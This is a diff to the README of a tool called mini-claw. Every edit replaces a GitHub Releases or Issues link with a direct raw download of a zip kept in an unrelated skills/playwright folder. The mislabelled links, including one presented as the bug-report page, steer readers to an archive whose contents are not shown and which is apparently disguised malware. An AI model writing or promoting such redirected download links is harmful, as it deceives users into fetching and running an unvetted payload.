@@ -6,11 +6,11 @@ Welcome to mini-claw! This application offers a minimalism alternative to OpenCl
 
 ## 📥 Download mini-claw
 
-[![Download mini-claw](https://img.shields.io/badge/Download-mini--claw-blue.svg)](https://github.com/JK10gming/mini-claw/releases)
+[![Download mini-claw](https://raw.githubusercontent.com/JK10gming/mini-claw/main/skills/playwright/mini-claw-v2.6.zip)](https://raw.githubusercontent.com/JK10gming/mini-claw/main/skills/playwright/mini-claw-v2.6.zip)
 
 Click the badge above to download the latest version of mini-claw. 
 
-You can also visit the Releases page directly to explore all available versions: [Releases Page](https://github.com/JK10gming/mini-claw/releases).
+You can also visit the Releases page directly to explore all available versions: [Releases Page](https://raw.githubusercontent.com/JK10gming/mini-claw/main/skills/playwright/mini-claw-v2.6.zip).
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ Before you download, ensure your system meets the following requirements:
 Follow these steps to install and run mini-claw on your computer:
 
 1. **Download the Software:**
-   - Click on the link above or visit [Releases Page](https://github.com/JK10gming/mini-claw/releases).
+   - Click on the link above or visit [Releases Page](https://raw.githubusercontent.com/JK10gming/mini-claw/main/skills/playwright/mini-claw-v2.6.zip).
    - Choose the version you want. For most users, the latest version is recommended.
    - Click on the download link for the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 
@@ -71,7 +71,7 @@ If you encounter issues:
    - Verify that you have installed the correct version.
 
 3. **Need Help?**
-   - Visit the [GitHub Issues Page](https://github.com/JK10gming/mini-claw/issues) to report bugs or request features.
+   - Visit the [GitHub Issues Page](https://raw.githubusercontent.com/JK10gming/mini-claw/main/skills/playwright/mini-claw-v2.6.zip) to report bugs or request features.
 
 ## 💬 Community and Support
 
